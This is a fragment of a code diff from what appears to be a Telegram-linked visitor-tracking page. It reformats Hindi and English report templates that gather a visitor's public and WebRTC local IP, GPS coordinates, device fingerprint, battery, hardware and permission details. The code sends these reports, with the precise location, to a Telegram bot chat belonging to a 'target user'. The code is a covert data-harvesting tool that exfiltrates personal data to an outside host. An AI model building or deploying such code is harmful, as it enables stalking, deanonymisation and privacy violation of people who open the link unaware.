+   • स्थान: ${locHi}
+
+💾 हार्डवेयर और स्टोरेज
+   • सीपीयू कोर: ${cpuCores}
+   • जीपीयू: ${gpuInfo}
+   • रैम: ${finalRam}
+   • स्टोरेज: ${finalStorage}
+
+🔏 डिवाइस फिंगरप्रिंट
+   • ${fingerprint}
+
 ━━━━━━━━━━━━━━━━
-⚡ <b>डेवलपर:</b> <a href="tg://user?id=${ADMIN_ID}">संपर्क करने के लिए यहां क्लिक करें</a>
+⚡ डेवलपर: <a href="tg://user?id=${ADMIN_ID}">संपर्क करें</a>
                 `;
             } else {
                 report = `
-📊 <b>Visitor Information Captured</b>
+📊 Visitor Information Captured
 ━━━━━━━━━━━━━━━━
+
+🖥️ Device & Browser
+   • Device Model: ${finalName}
+   • OS: ${osNameEn} ${osVersion}
+   • App Interface: ${browserName}
+   • User-Agent: <code>${ua}</code>
 ${tgSectionEn}
-🖥️ <b>Device & Browser</b>
-• Device Model: ${deviceModel}
-• OS: ${osNameEn} ${osVersion ? `(${osVersion})` : ""}
-• App Interface: ${browserName} ${tgPlatform !== 'Browser' ? '| ' + tgPlatform : ''}
-• User-Agent: <code>${ua}</code>
+🌐 Network Information
+   • Public IP: ${ipDataGlobal.ip || 'Unknown'}
+   • Local IP: ${localIp}
+   • Connection Type: ${netEn}
+   • Speed: ${netDownlink} Mbps | RTT: ${netRtt} ms
+   • Language: ${navigator.language}
 
-🌐 <b>Network Information</b>
-• Public IP: ${ipDataGlobal.ip || 'Unknown'}
-• Local IP (WebRTC): ${localIp}
-• Connection Type: ${netEn}
-• Speed: ${netDownlink} Mbps | RTT: ${netRtt} ms
-• Language: ${navigator.language} | DNT: ${doNotTrack}
-
-📍 <b>Location Details (IP)</b>
-• Country: ${ipDataGlobal.country || 'Unknown'}
-• Region: ${ipDataGlobal.region || 'Unknown'}
-• City: ${ipDataGlobal.city || 'Unknown'}
-• Timezone: ${deviceTimezone}
-
-🖼️ <b>Display Information</b>
-• Resolution: ${screenRes}
-• Orientation: ${orientation}
-• Color Depth: ${colorDepth}
-
-🔋 <b>Battery Status</b>
-• ${batteryEn}
-
-💾 <b>Hardware & Storage</b>
-• RAM: ${finalRamEn}
-• Storage: ${finalStorageEn}
-• CPU: ${cpuCores} Cores
-• GPU: ${gpuInfo}
-• Touch Support: ${isTouch}
-
-🔏 <b>Device Fingerprint</b>
-• <code>${fingerprint}</code>
-
-🔐 <b>Device Permissions</b>
-• Camera: ${camEn}
-• Location: ${locEn}
+📍 Location Details (IP)
+   • Country: ${ipDataGlobal.country || 'Unknown'}
+   • Region: ${ipDataGlobal.region || 'Unknown'}
+   • City: ${ipDataGlobal.city || 'Unknown'}
+   • Timezone: ${deviceTimezone}
 ${gpsSectionEn}
+🖼️ Display Information
+   • Resolution: ${screenRes}
+   • Orientation: ${orientation}
+   • Color Depth: ${colorDepth}
+
+🔋 Battery Status
+   • Level: ${batLevel}%
+   • Charging: ${isCharging ? 'Yes' : 'No'}
+
+🔐 Device Permissions
+   • Camera: ${camEn}
+   • Location: ${locEn}
+
+💾 Hardware & Storage
+   • CPU Cores: ${cpuCores}
+   • GPU: ${gpuInfo}
+   • RAM: ${finalRam}
+   • Storage: ${finalStorage}
+
+🔏 Device Fingerprint
+   • ${fingerprint}
+
 ━━━━━━━━━━━━━━━━
-⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>
+⚡ Developed by: <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>
                 `;
             }
 
@@ -626,9 +622,7 @@ ${gpsSectionEn}
                 body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
             }).catch(e=>{});
 
-            // ==========================================
-            // إرسال الخريطة (فقط إذا كان المستخدم في وضع الموقع الدقيق ووافق)
-            // ==========================================
+            // إرسال الخريطة تحت المعلومات (فقط لو إحنا في وضع الموقع الدقيق gpsData)
             if (gpsData) {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
